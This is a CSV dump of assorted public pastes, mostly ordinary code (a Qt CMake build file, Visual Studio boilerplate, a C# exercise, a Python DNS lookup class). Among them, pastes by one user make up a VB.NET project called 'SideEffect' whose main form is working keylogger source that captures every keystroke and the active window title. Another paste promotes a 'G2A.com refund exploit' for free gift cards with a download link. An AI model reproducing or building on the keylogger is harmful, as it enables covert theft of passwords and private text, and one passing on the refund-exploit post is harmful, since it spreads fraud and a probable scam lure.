id,title,username,language,date,content
iJxCH33R,Untitled,vladislav_larionov,CMake,Friday 29th of December 2023 06:04:04 AM CDT,"# SPDX-FileCopyrightText: 2023 Open Mobile Platform LLC <community@omp.ru>
# SPDX-License-Identifier: BSD-3-Clause

cmake_minimum_required (VERSION 3.1)

project(HttpServer)

find_package (Qt5 COMPONENTS Core Network Quick REQUIRED)

set(SOURCES
    HttpServer/src/httpServer/httpConnection.cpp
    HttpServer/src/httpServer/httpData.cpp
    HttpServer/src/httpServer/httpRequest.cpp
    HttpServer/src/httpServer/httpRequestRouter.cpp
    HttpServer/src/httpServer/httpResponse.cpp
    HttpServer/src/httpServer/httpServer.cpp
    HttpServer/src/httpServer/middleware/CORS.cpp
    HttpServer/src/httpServer/middleware/auth.cpp
    HttpServer/src/httpServer/middleware/getArray.cpp
    HttpServer/src/httpServer/middleware/getObject.cpp
    HttpServer/src/httpServer/middleware/verifyJson.cpp
    HttpServer/src/httpServer/util.cpp
)

set(HEADERS
    HttpServer/src/httpServer/const.h
    HttpServer/src/httpServer/httpConnection.h
    HttpServer/src/httpServer/httpCookie.h
    HttpServer/src/httpServer/httpData.h
    HttpServer/src/httpServer/httpRequest.h
    HttpServer/src/httpServer/httpRequestHandler.h
    HttpServer/src/httpServer/httpRequestRouter.h
    HttpServer/src/httpServer/httpResponse.h
    HttpServer/src/httpServer/httpServer.h
    HttpServer/src/httpServer/httpServerConfig.h
    HttpServer/src/httpServer/middleware.h
    HttpServer/src/httpServer/util.h
)

set(CMAKE_BUILD_TYPE Release)

add_library(${PROJECT_NAME} SHARED ${SOURCES} ${HEADERS})

target_include_directories(${PROJECT_NAME}
    INTERFACE
        ${CMAKE_CURRENT_SOURCE_DIR}
)
target_include_directories(${PROJECT_NAME}
    PUBLIC
        $<BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/HttpServer/src/httpServer>
        $<INSTALL_INTERFACE:${CMAKE_INSTALL_INCLUDEDIR}>
)

set_target_properties(${PROJECT_NAME} PROPERTIES VERSION 1)
set_target_properties(${PROJECT_NAME} PROPERTIES SOVERSION 1)

set_target_properties(${PROJECT_NAME} PROPERTIES PUBLIC_HEADER ""${HEADERS}"")
add_compile_definitions(HTTPSERVER_LIBRARY)
add_compile_definitions(QT_DEPRECATED_WARNINGS)
target_link_libraries(HttpServer
    Qt5::Quick
    Qt5::Core
    qtpromise
    z
)
include(GNUInstallDirs)

set(CMAKE_INSTALL_PREFIX ${CMAKE_BINARY_DIR}/${PROJECT_NAME})

message(""!!! ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_INCLUDEDIR}"")
message(""!!! ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_LIBDIR}"")
install(TARGETS ${PROJECT_NAME}
    LIBRARY DESTINATION ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_LIBDIR}
    PUBLIC_HEADER DESTINATION ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_INCLUDEDIR}
    INCLUDES DESTINATION ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_INCLUDEDIR} # include
)
"
ESWzdBdc,My Project/Resources.Designer.vb,FlyFar,VB.NET,Friday 29th of December 2023 06:03:28 AM CDT,"'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On


Namespace My.Resources

    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""4.0.0.0""), _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(), _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()> _
    Friend Module Resources

        Private resourceMan As Global.System.Resources.ResourceManager

        Private resourceCulture As Global.System.Globalization.CultureInfo

        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager(""SideEffect.Resources"", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property

        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set(ByVal value As Global.System.Globalization.CultureInfo)
                resourceCulture = value
            End Set
        End Property
    End Module
End Namespace"
RLv7ashn,data797,TestGuy1,JSON,Friday 29th of December 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8f3b843bd8c50664c0173539bc2e34a5ae97bffa8254696321cdb79475d5f7db23bf426223e23bd01a0e0e9e306b3e730f674ecbfe34a1c996732353348175d341b29e46afe26929f1dee7266cc0c146ea3a8157198369bc02c574c356cc238be243c02c782783b63afb1c82961846740b9d7a99d6d3361a7171bd42078c9775',
  otherdata: [
    'ff1bda8dab0b4782beaea18e9ba31d5d',
    'ab51fcc82083cf87eccf4ca4421fe009',
    '273d9d210bd5f97d7708560b25a3072f',
    'f010028c79de184e8e0acf086a0a0afa',
    'a29152fa5075877fb0e56cecb34b3ad4',
    'c7e1824f99a55ee707ee49ad6f490f7e',
    '1a8ca80aa651a0c78abcb2ce37bd8791',
    '0a9229c28ddf8d50f02cba0db0d0039c'
  ]
}"
FFnTCG4A,MyProject/Settings.Designer.vb,FlyFar,VB.NET,Friday 29th of December 2023 05:59:15 AM CDT,"'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On


Namespace My

    <Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(), _
     Global.System.CodeDom.Compiler.GeneratedCodeAttribute(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""11.0.0.0""), _
     Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
    Partial Friend NotInheritable Class MySettings
        Inherits Global.System.Configuration.ApplicationSettingsBase

        Private Shared defaultInstance As MySettings = CType(Global.System.Configuration.ApplicationSettingsBase.Synchronized(New MySettings), MySettings)

#Region ""My.Settings Auto-Save Functionality""
#If _MyType = ""WindowsForms"" Then
        Private Shared addedHandler As Boolean

        Private Shared addedHandlerLockObject As New Object

        <Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Private Shared Sub AutoSaveSettings(ByVal sender As Global.System.Object, ByVal e As Global.System.EventArgs)
            If My.Application.SaveMySettingsOnExit Then
                My.Settings.Save()
            End If
        End Sub
#End If
#End Region

        Public Shared ReadOnly Property [Default]() As MySettings
            Get

#If _MyType = ""WindowsForms"" Then
                   If Not addedHandler Then
                        SyncLock addedHandlerLockObject
                            If Not addedHandler Then
                                AddHandler My.Application.Shutdown, AddressOf AutoSaveSettings
                                addedHandler = True
                            End If
                        End SyncLock
                    End If
#End If
                Return defaultInstance
            End Get
        End Property
    End Class
End Namespace

Namespace My

    <Global.Microsoft.VisualBasic.HideModuleNameAttribute(), _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute()> _
    Friend Module MySettingsProperty

        <Global.System.ComponentModel.Design.HelpKeywordAttribute(""My.Settings"")> _
        Friend ReadOnly Property Settings() As Global.SideEffect.My.MySettings
            Get
                Return Global.SideEffect.My.MySettings.Default
            End Get
        End Property
    End Module
End Namespace"
tmP26GCR,FrmMain.Designer.vb,FlyFar,VB.NET,Friday 29th of December 2023 05:58:03 AM CDT,"<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class FrmMain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.TextBox = New System.Windows.Forms.TextBox()
        Me.kClock = New System.Windows.Forms.Timer(Me.components)
        Me.tClock = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'TextBox
        '
        Me.TextBox.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TextBox.Location = New System.Drawing.Point(0, 0)
        Me.TextBox.Multiline = True
        Me.TextBox.Name = ""TextBox""
        Me.TextBox.Size = New System.Drawing.Size(397, 265)
        Me.TextBox.TabIndex = 0
        '
        'kClock
        '
        '
        'tClock
        '
        '
        'FrmMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(397, 265)
        Me.Controls.Add(Me.TextBox)
        Me.Name = ""FrmMain""
        Me.Text = ""SideEffect""
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents TextBox As TextBox
    Friend WithEvents kClock As Timer
    Friend WithEvents tClock As Timer
End Class"
yWkgb4DT,FrmMain.vb,FlyFar,VB.NET,Friday 29th of December 2023 05:56:20 AM CDT,"Public Class FrmMain

#Region ""Declare""
    Private Declare Function GetAsyncKeyState Lib ""user32"" (ByVal vKey As Int32) As Int32
    Private Declare Function GetKeyState Lib ""user32"" (ByVal nVirtKey As Int32) As Int32
    Private Declare Function GetWindowText Lib ""user32.dll"" Alias ""GetWindowTextA"" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Private Declare Function GetForegroundWindow Lib ""user32.dll"" () As Int32
    Dim LastStr As String, i As Object, KeyPressed As Object
    Dim charCount As Short, lineLimit As Short = 69, addkey As Object
#End Region

#Region ""EntryPoint""
    Sub New()
        InitializeComponent()
        SetTimer()
        StartTimer()
    End Sub
#End Region

#Region ""SetTimer""
    Private Sub SetTimer()
        kClock.Interval = 6
        tClock.Interval = 60
    End Sub
#End Region

#Region ""StartTimer""
    Private Sub StartTimer()
        kClock.Start()
        tClock.Start()
    End Sub
#End Region

#Region ""Function""
    Public Function getCapslock() As Boolean
        getCapslock = CBool(GetKeyState(Keys.Capital) And 1)
    End Function
    Public Function getShift() As Boolean
        getShift = CBool(GetAsyncKeyState(Keys.ShiftKey))
    End Function
    Private Function GetActiveWindowTitle() As String
        On Error Resume Next
        Dim Str As String
        Str = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, Str, 100)
        Str = Str.Substring(0, InStr(Str, Chr(0)) - 1)
        Return Str
    End Function
#End Region

#Region ""Keylogger""
    Private Sub kClock_Tick(sender As Object, e As EventArgs) Handles kClock.Tick
        On Error Resume Next
        KeyPressed = GetAsyncKeyState(13)
        If KeyPressed = -32767 Then
            charCount = 0
            addkey = vbCrLf
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(8)
        If KeyPressed = -32767 Then
            addkey = ""<BackSpace>""
            charCount += 4
            GoTo KeyFound
        End If


        KeyPressed = GetAsyncKeyState(32)
        If KeyPressed = -32767 Then
            addkey = "" ""
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(186)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "";""
            Else
                addkey = "":""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(187)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""=""
            Else
                addkey = ""+""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(188)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "",""
            Else
                addkey = ""<""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(189)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""-""
            Else
                addkey = ""_""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(190)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "".""
            Else
                addkey = "">""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(191)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""/""
            Else
                addkey = ""?""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(192)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""`""
            Else
                addkey = ""~""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(96)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""0""
            Else
                addkey = "")""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(97)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""1""
            Else
                addkey = ""!""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(98)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""2""
            Else
                addkey = ""@""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(99)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""3""
            Else
                addkey = ""#""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(100)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""4""
            Else
                addkey = ""$""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(101)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""5""
            Else
                addkey = ""%""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(102)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""6""
            Else
                addkey = ""7""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(103)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""7""
            Else
                addkey = ""&""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(104)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""8""
            Else
                addkey = ""*""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(105)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""9""
            Else
                addkey = ""(""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(106)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""*""
                charCount += 1
            Else
                addkey = """"
            End If
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(107)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""+""
            Else
                addkey = ""=""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(108)
        If KeyPressed = -32767 Then
            addkey = """"
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(109)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""-""
            Else
                addkey = ""_""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(110)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "".""
            Else
                addkey = "">""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(111)
        If KeyPressed = -32767 Then
            addkey = ""/""
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(2)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""/""
            Else
                addkey = ""?""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(220)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""\""
            Else
                addkey = ""|""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(222)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""'""
            Else
                addkey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(221)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""]""
            Else
                addkey = ""}""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(219)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""[""
            Else
                addkey = ""{""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        For i = 65 To 128
            KeyPressed = GetAsyncKeyState(i)
            If KeyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addkey = UCase(Chr(i))
                    Else
                        addkey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addkey = UCase(Chr(i))
                    Else
                        addkey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            KeyPressed = GetAsyncKeyState(i)
            If KeyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addkey = ""!""
                        Case 2
                            addkey = ""@""
                        Case 3
                            addkey = ""#""
                        Case 4
                            addkey = ""$""
                        Case 5
                            addkey = ""%""
                        Case 6
                            addkey = ""^""
                        Case 7
                            addkey = ""&""
                        Case 8
                            addkey = ""*""
                        Case 9
                            addkey = ""(""
                        Case 0
                            addkey = "")""
                    End Select
                Else
                    addkey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        Application.DoEvents()
        Exit Sub


KeyFound:
        If charCount > lineLimit Then
            charCount = 0
            TextBox.AppendText(vbCrLf)
        End If
        If addkey <> """" Then TextBox.AppendText(addkey)
        Application.DoEvents()

    End Sub

    Private Sub tClock_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tClock.Tick
        On Error Resume Next
        If LastStr <> GetActiveWindowTitle() Then
            TextBox.AppendText(vbNewLine & "" [ --"" & GetActiveWindowTitle() & ""--]"" & vbNewLine)
            LastStr = GetActiveWindowTitle()
        End If
    End Sub
#End Region

End Class"
MYqPmm2a,SideEffect.vbproj,FlyFar,VB.NET,Friday 29th of December 2023 05:55:49 AM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<Project ToolsVersion=""14.0"" DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Import Project=""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"" />
  <PropertyGroup>
    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>
    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>
    <ProjectGuid>{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <StartupObject>SideEffect.My.MyApplication</StartupObject>
    <RootNamespace>SideEffect</RootNamespace>
    <AssemblyName>SideEffect</AssemblyName>
    <FileAlignment>512</FileAlignment>
    <MyType>WindowsForms</MyType>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <DefineDebug>true</DefineDebug>
    <DefineTrace>true</DefineTrace>
    <OutputPath>bin\Debug\</OutputPath>
    <DocumentationFile>SideEffect.xml</DocumentationFile>
    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <DefineDebug>false</DefineDebug>
    <DefineTrace>true</DefineTrace>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DocumentationFile>SideEffect.xml</DocumentationFile>
    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
  </PropertyGroup>
  <PropertyGroup>
    <OptionExplicit>On</OptionExplicit>
  </PropertyGroup>
  <PropertyGroup>
    <OptionCompare>Binary</OptionCompare>
  </PropertyGroup>
  <PropertyGroup>
    <OptionStrict>Off</OptionStrict>
  </PropertyGroup>
  <PropertyGroup>
    <OptionInfer>On</OptionInfer>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System"" />
    <Reference Include=""System.Data"" />
    <Reference Include=""System.Deployment"" />
    <Reference Include=""System.Drawing"" />
    <Reference Include=""System.Windows.Forms"" />
    <Reference Include=""System.Xml"" />
    <Reference Include=""System.Core"" />
    <Reference Include=""System.Xml.Linq"" />
    <Reference Include=""System.Data.DataSetExtensions"" />
  </ItemGroup>
  <ItemGroup>
    <Import Include=""Microsoft.VisualBasic"" />
    <Import Include=""System"" />
    <Import Include=""System.Collections"" />
    <Import Include=""System.Collections.Generic"" />
    <Import Include=""System.Data"" />
    <Import Include=""System.Drawing"" />
    <Import Include=""System.Diagnostics"" />
    <Import Include=""System.Windows.Forms"" />
    <Import Include=""System.Linq"" />
    <Import Include=""System.Xml.Linq"" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include=""FrmMain.vb"">
      <SubType>Form</SubType>
    </Compile>
    <Compile Include=""FrmMain.Designer.vb"">
      <DependentUpon>FrmMain.vb</DependentUpon>
      <SubType>Form</SubType>
    </Compile>
    <Compile Include=""My Project\AssemblyInfo.vb"" />
    <Compile Include=""My Project\Application.Designer.vb"">
      <AutoGen>True</AutoGen>
      <DependentUpon>Application.myapp</DependentUpon>
    </Compile>
    <Compile Include=""My Project\Resources.Designer.vb"">
      <AutoGen>True</AutoGen>
      <DesignTime>True</DesignTime>
      <DependentUpon>Resources.resx</DependentUpon>
    </Compile>
    <Compile Include=""My Project\Settings.Designer.vb"">
      <AutoGen>True</AutoGen>
      <DependentUpon>Settings.settings</DependentUpon>
      <DesignTimeSharedInput>True</DesignTimeSharedInput>
    </Compile>
  </ItemGroup>
  <ItemGroup>
    <EmbeddedResource Include=""FrmMain.resx"">
      <DependentUpon>FrmMain.vb</DependentUpon>
    </EmbeddedResource>
    <EmbeddedResource Include=""My Project\Resources.resx"">
      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
      <CustomToolNamespace>My.Resources</CustomToolNamespace>
      <SubType>Designer</SubType>
    </EmbeddedResource>
  </ItemGroup>
  <ItemGroup>
    <None Include=""My Project\Application.myapp"">
      <Generator>MyApplicationCodeGenerator</Generator>
      <LastGenOutput>Application.Designer.vb</LastGenOutput>
    </None>
    <None Include=""My Project\Settings.settings"">
      <Generator>SettingsSingleFileGenerator</Generator>
      <CustomToolNamespace>My</CustomToolNamespace>
      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
    </None>
  </ItemGroup>
  <Import Project=""$(MSBuildToolsPath)\Microsoft.VisualBasic.targets"" />
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name=""BeforeBuild"">
  </Target>
  <Target Name=""AfterBuild"">
  </Target>
  -->
</Project>"
hLw3ursF,SideEffect.sln,FlyFar,VisualBasic,Friday 29th of December 2023 05:55:01 AM CDT,"
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project(""{F184B08F-C81C-45F6-A57F-5ABD9991F28F}"") = ""SideEffect"", ""SideEffect\SideEffect.vbproj"", ""{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}""
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal"
WLSacmhn,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Friday 29th of December 2023 05:54:58 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.

PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit.pdf

Working as of 
29 December 2023

555524"
fFAF8V2N,Untitled,kwest87,C#,Friday 29th of December 2023 04:57:00 AM CDT,"using System;

namespace ConsoleApp17
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int maximumRandomNumber = 100;
            int resultingNumber = random.Next(maximumRandomNumber);
            int initialNumber = 2;
            int degreeNumber = 2;
            int degreeResultingNumber = 1;

            while (resultingNumber > initialNumber)
            {
                initialNumber *= degreeNumber;
                degreeResultingNumber++;
            }

            Console.WriteLine($""Минимальная степень {degreeNumber} превосходящая {resultingNumber} ,будет  {degreeResultingNumber} или число {initialNumber}."");
        }
  "
pbramNjF,DNS Resolver,xGHOSTSECx,Python,Friday 29th of December 2023 04:43:29 AM CDT,"import dns.resolver
import dns.reversename
import asyncio

class DnsTool:
    def __init__(self, dns_servers=('8.8.8.8', '8.8.4.4')):
        self.dns_servers = dns_servers
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = self.dns_servers

    def resolve(self, query_host, record_type='A'):
        try:
            result = self.resolver.resolve(query_host, record_type)
            return [r.to_text() for r in result] if result.response else None
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout) as e:
            return str(e)
        except Exception as e:
            return f""Error: {str(e)}""

    async def async_resolve(self, query_host, record_type='A'):
        loop = asyncio.get_event_loop()
        try:
            result = await loop.run_in_executor(None, self.resolve, query_host, record_type)
            return result
        except Exception as e:
            return f""Error: {str(e)}""

    def full_scan(self, query_host):
        scan_results = {}

        for record_type in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT']:
            result = self.resolve(query_host, record_type)
            if result:
                scan_results[record_type] = result

        return scan_results

    def reverse_lookup(self, ip_address):
        try:
            result = self.resolver.query(dns.reversename.from_address(ip_address), 'PTR')
            return [r.to_text() for r in result] if result.response else None
        except (dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
            return str(e)
        except Exception as e:
            return f""Error: {str(e)}""

    def check_dnssec(self, query_host):
        try:
            result = self.resolver.resolve(query_host, 'DNSKEY')
            return f""{query_host} has DNSSEC enabled."" if result.response else f""{query_host} does not have DNSSEC enabled.""
        except (dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
            return str(e)
        except Exception as e:
            return f""Error: {str(e)}""

    def scan_multiple_servers(self, query_host):
        scan_results = {}

        for server in self.dns_servers:
            self.resolver.nameservers = [server]
            scan_results[server] = self.full_scan(query_host)

        return scan_results

# Example usage
async def main():
    dns_tool = DnsTool()

    hostname = 'example.com'
    ip_address = '93.184.216.34'

    a_record = dns_tool.resolve(hostname)
    print(f'The A record for {hostname} is: {a_record}')

    scan_results = dns_tool.full_scan(hostname)
    print(f'\nFull DNS scan results for {hostname}:')
    for record_type, result in scan_results.items():
        print(f'{record_type} records: {result}')

    reverse_lookup_result = dns_tool.reverse_lookup(ip_address)
    print(f'\nReverse DNS lookup for {ip_address}: {reverse_lookup_result}')

    a_record_async = await dns_tool.async_resolve(hostname)
    print(f'\nAsynchronously resolved A record for {hostname}: {a_record_async}')

    dnssec_status = dns_tool.check_dnssec(hostname)
    print(f'\nDNSSEC status for {hostname}: {dnssec_status}')

    scan_results_multi_servers = dns_tool.scan_multiple_servers(hostname)
    print(f'\nScan results for multiple DNS servers:')
